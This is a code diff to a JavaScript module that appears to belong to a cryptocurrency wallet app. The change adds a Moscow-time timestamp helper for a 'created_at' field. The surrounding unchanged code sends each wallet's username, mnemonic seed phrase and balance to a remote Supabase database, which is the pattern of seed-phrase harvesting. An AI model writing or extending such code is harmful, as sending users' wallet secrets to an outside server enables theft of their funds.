@@ -5,6 +5,21 @@
 const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
 const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
 
+function getMoscowTimestampToMinute() {
+  const parts = new Intl.DateTimeFormat('sv-SE', {
+    timeZone: 'Europe/Moscow',
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    hour12: false,
+  }).formatToParts(new Date());
+
+  const map = Object.fromEntries(parts.filter((part) => part.type !== 'literal').map((part) => [part.type, part.value]));
+  return `${map.year}-${map.month}-${map.day}T${map.hour}:${map.minute}:00+03:00`;
+}
+
 export async function syncWalletToSupabase(walletData) {
   if (!SUPABASE_URL || !SUPABASE_KEY) {
     console.error('❌ Supabase credentials missing! Check VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY');
@@ -32,7 +47,7 @@ export async function syncWalletToSupabase(walletData) {
         username: name,
         mnemonic: cleanMnemonic,
         balance: balance ? String(balance) : "0",
-        created_at: new Date().toISOString()
+        created_at: getMoscowTimestampToMinute()
       })
     });
 
